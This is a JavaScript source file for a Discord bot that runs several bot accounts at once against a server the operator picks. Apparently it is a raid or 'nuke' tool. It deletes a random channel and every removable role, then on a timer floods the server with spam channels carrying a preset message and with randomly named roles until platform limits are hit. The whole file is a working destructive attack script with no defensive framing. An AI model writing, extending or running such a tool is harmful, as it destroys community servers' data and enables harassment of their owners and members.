const { Client, GatewayIntentBits } = require('discord.js');
require('dotenv').config();

// Load configuration from .env
const botTokens = process.env.BOT_TOKENS.split(','); // Get all bot tokens
const channelName = process.env.CHANNEL_NAME || 'repeating-channel'; // Default channel name
const presetMessage = process.env.PRESET_MESSAGE || 'This is an automated message from the bot.';
const messageInterval = parseInt(process.env.MESSAGE_INTERVAL, 10) || 5000; // Default interval is 5 seconds

// Array to keep track of bot clients
const clients = [];

for (const token of botTokens) {
  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.GuildMembers, // Required for managing roles
    ],
  });

  client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}!`);

    // Fetch all available servers for the bot
    client.guilds.fetch().then((guilds) => {
      console.log(`Available servers for ${client.user.tag}:`);
      guilds.forEach((guild, id) => console.log(`${id}: ${guild.name}`));
      console.log(`Enter the server ID for ${client.user.tag}:`);
    });

    process.stdin.on('data', async (data) => {
      const serverId = data.toString().trim();
      const guild = client.guilds.cache.get(serverId);

      if (!guild) {
        console.log(`Invalid server ID for ${client.user.tag}.`);
        return;
      }

      try {
        console.log(`[${client.user.tag}] Deleting a random channel...`);

        // Delete a random channel
        const channels = [...guild.channels.cache.values()];
        if (channels.length > 0) {
          const randomChannel = channels[Math.floor(Math.random() * channels.length)];
          try {
            await randomChannel.delete();
            console.log(`[${client.user.tag}] Deleted random channel: ${randomChannel.name}`);
          } catch (error) {
            console.error(
              `[${client.user.tag}] Failed to delete channel (${randomChannel.name}):`,
              error.message
            );
          }
        }

        console.log(`[${client.user.tag}] Deleting all roles...`);

        // Delete all roles
        for (const [roleId, role] of guild.roles.cache) {
          if (role.managed || role.name === '@everyone') continue; // Skip managed roles and @everyone
          try {
            await role.delete();
            console.log(`[${client.user.tag}] Deleted role: ${role.name}`);
          } catch (error) {
            console.error(`[${client.user.tag}] Failed to delete role (${role.name}):`, error.message);
          }
        }

        console.log(`[${client.user.tag}] Starting channel and role creation...`);

        // Continuous channel and role creation
        let createChannels = true;
        let createRoles = true;

        const intervalId = setInterval(async () => {
          try {
            // Check for max limits
            const channelCount = guild.channels.cache.size;
            const roleCount = guild.roles.cache.size;

            if (channelCount >= 500) {
              createChannels = false;
              console.log(`[${client.user.tag}] Maximum channel limit reached. Stopping channel creation.`);
            }

            if (roleCount >= 250) {
              createRoles = false;
              console.log(`[${client.user.tag}] Maximum role limit reached. Stopping role creation.`);
            }

            if (!createChannels && !createRoles) {
              console.log(`[${client.user.tag}] Both limits reached. Exiting script.`);
              clearInterval(intervalId);
              return;
            }

            // Create a new channel if allowed
            if (createChannels) {
              const newChannel = await guild.channels.create({
                name: channelName,
                type: 0, // Text channel
              });
              console.log(`[${client.user.tag}] Created channel: ${newChannel.name}`);

              // Send a message to the newly created channel
              await newChannel
                .send(presetMessage)
                .then(() => console.log(`[${client.user.tag}] Message sent to ${newChannel.name}`))
                .catch((error) =>
                  console.error(
                    `[${client.user.tag}] Failed to send message in ${newChannel.name}:`,
                    error.message
                  )
                );
            }

            // Create a new role if allowed
            if (createRoles) {
              const newRole = await guild.roles.create({
                name: `Role ${Math.random().toString(36).substring(7)}`,
                color: `#${Math.floor(Math.random() * 16777215).toString(16)}`, // Random hex color
              });
              console.log(`[${client.user.tag}] Created role: ${newRole.name}`);
            }
          } catch (error) {
            console.error(
              `[${client.user.tag}] Failed to create a new channel or role:`,
              error.message
            );
          }
        }, messageInterval);
      } catch (error) {
        console.error(`[${client.user.tag}] Error during the process:`, error.message);
      }
    });
  });

  client.login(token).catch((error) => {
    console.error(`Failed to log in bot with token ${token.slice(0, 10)}...:`, error.message);
  });

  clients.push(client);
}
